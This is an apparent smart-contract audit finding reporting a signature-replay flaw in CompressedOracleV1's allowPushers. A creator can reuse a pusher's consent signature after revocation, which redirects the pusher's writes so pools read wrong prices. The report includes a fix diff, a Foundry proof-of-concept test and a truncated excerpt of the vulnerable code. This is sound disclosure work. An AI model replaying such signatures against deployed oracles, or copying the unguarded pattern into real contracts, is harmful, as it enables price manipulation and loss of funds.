### Title
`allowPushers` Consent Signature Replay Re-establishes Revoked Delegation, Silently Redirecting Pusher Writes Into Creator Namespace and Feeding Bad Prices to Pools — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracleV1::allowPushers` unconditionally overwrites `namespaceRemapping[pusher]` after verifying a pusher's EIP-191 consent signature. Because the signature domain contains no nonce and no "current delegation state," a creator can replay the same valid signature any number of times before the deadline expires — including after the pusher has called `revokePusher()`. This re-establishes the delegation without the pusher's knowledge, silently redirecting all subsequent fallback pushes into the creator's namespace. If the pusher has since begun pushing prices for a different feed or asset pair (their own namespace), those wrong prices land in the creator's namespace and are consumed by pools, producing bad-price execution.

---

### Finding Description

`CompressedOracleV1` is a registrationless oracle where a feed's identity is its storage location. A creator delegates write authority to a pusher via `allowPushers`, which verifies an EIP-191 signature over `(chainid, oracle, deadline, pusher, creator)` and writes `namespaceRemapping[pusher] = creator`. [1](#0-0) 

A pusher can self-revoke via `revokePusher()`, which clears the mapping to `address(0)`: [2](#0-1) 

After revocation, the `fallback()` push path resolves the namespace as the pusher's own address (the `address(0)` fallback branch): [3](#0-2) 

**The missing guard:** `allowPushers` does not check whether `namespaceRemapping[pusher]` is already `address(0)` (revoked state) before overwriting it. The signature domain contains no nonce and no "current state" commitment, so the creator can call `allowPushers` again with the identical signature — as long as `block.timestamp <= deadline` — and the mapping is silently restored to `creator`: [4](#0-3) 

The code's own NatSpec acknowledges the risk ("an undated signature could re-establish a delegation AFTER the pusher revoked it") and claims the deadline is the mitigation. But the deadline only bounds the replay window — it does not prevent replay within that window. There is no nonce, no revocation flag, and no check that the pusher has not already revoked. [5](#0-4) 

This is the direct analog of the external `entropyCallback` bug: just as `_createAuctionWithRandomNumber` overwrites `auctionStorage` without checking `auctionStorage.settled`, `allowPushers` overwrites `namespaceRemapping[pusher]` without checking whether the pusher has already revoked.

---

### Impact Explanation

After the creator replays `allowPushers`, the pusher's `fallback()` calls resolve to the creator's namespace again — without the pusher's knowledge. If the pusher has since begun pushing prices for a different feed or asset pair (their own namespace), those prices land in the creator's namespace instead. Pools that consume the creator's feeds via `price(feedId, pool)` → `getOracleData` → `_loadSlotLayout` receive the wrong mid price, spread0, and spread1 values, producing bad-price execution on every swap until the creator's slot is overwritten by a legitimate update. [6](#0-5) 

The slot layout packs all four feed positions and the shared timestamp into one 256-bit word; a single misdirected push overwrites all four positions and the timestamp for the entire slot: [7](#0-6) 

This satisfies the "bad-price execution" impact gate: a stale or wrong bid/ask quote reaches a pool swap.

---

### Likelihood Explanation

The trigger requires two semi-trusted actors: the pusher (who revokes) and the creator (who replays the signature). The creator has a direct economic incentive to keep the pusher's data flowing into their namespace. The replay requires no new signature from the pusher — only the original consent bytes and a deadline that has not yet expired. Deadlines are typically set days or weeks in the future (as shown in the test suite using `block.timestamp + 1 days`), giving the creator a wide replay window. [8](#0-7) 

---

### Recommendation

Add a per-pusher revocation nonce to the signature domain. Increment the nonce on every `revokePusher()` / `removePushers()` call. Include the current nonce in the signed message so that any previously issued consent signature is invalidated the moment the pusher revokes.

```diff
+ mapping(address => uint256) public pusherNonce;

  function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
      _ensureDeadline(deadline);
      ...
      bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
-         keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
+         keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender, pusherNonce[pusher]))
      );
      require(pusher == ECDSA.recover(hash, signatures[i]));
      namespaceRemapping[pusher] = msg.sender;
      ...
  }

      ...
      namespaceRemapping[msg.sender] = address(0);
+     pusherNonce[msg.sender]++;
      ...

```

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

// Setup: creator, pusher, oracle deployed.
// 1. Pusher signs consent for creator with deadline = now + 1 days.
// 2. Creator calls allowPushers → namespaceRemapping[pusher] = creator.
// 3. Pusher calls revokePusher() → namespaceRemapping[pusher] = address(0).
//    Pusher now pushes BTC/USD prices into their OWN namespace (slot 5, pos 0).
// 4. Creator calls allowPushers AGAIN with the SAME signature (deadline still valid).
//    → namespaceRemapping[pusher] = creator  (re-established, no new pusher consent).
// 5. Pusher pushes what they believe are their own BTC/USD prices.
//    fallback() resolves namespaceRemapping[pusher] = creator → writes into creator's slot 5.
// 6. Pool consuming creator's feedIdOf(creator, 5, 0) (an ETH/USD feed) now reads BTC/USD price.

function testReplayAllowPushersAfterRevoke() public {
    uint256 deadline = block.timestamp + 1 days;
    bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

    address[] memory pushers = new address[](1);
    pushers[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // Step 2: initial delegation
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator);

    // Step 3: pusher revokes
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0));

    // Step 4: creator replays the SAME signature — succeeds, no revert
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);  // same sig, same deadline
    assertEq(oracle.namespaceRemapping(pusher), creator);  // delegation restored

    // Step 5: pusher pushes "own namespace" BTC/USD price
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 btcRaw = _packRaw(3_000_000, 3, 3); // BTC/USD price
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(_wordAt(5, 0, btcRaw, tsMs));
    assertTrue(ok);

    // Step 6: BTC/USD price landed in CREATOR's namespace, not pusher's
    IOffchainOracle.OracleData memory creatorData =
        oracle.getOracleData(oracle.feedIdOf(creator, 5, 0));
    assertEq(creatorData.price, U64x32.decode(uint32(btcRaw >> 16)));  // wrong price in creator's feed

    IOffchainOracle.OracleData memory pusherData =
        oracle.getOracleData(oracle.feedIdOf(pusher, 5, 0));
    assertEq(pusherData.price, 0);  // pusher's own namespace is empty
}
```

    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
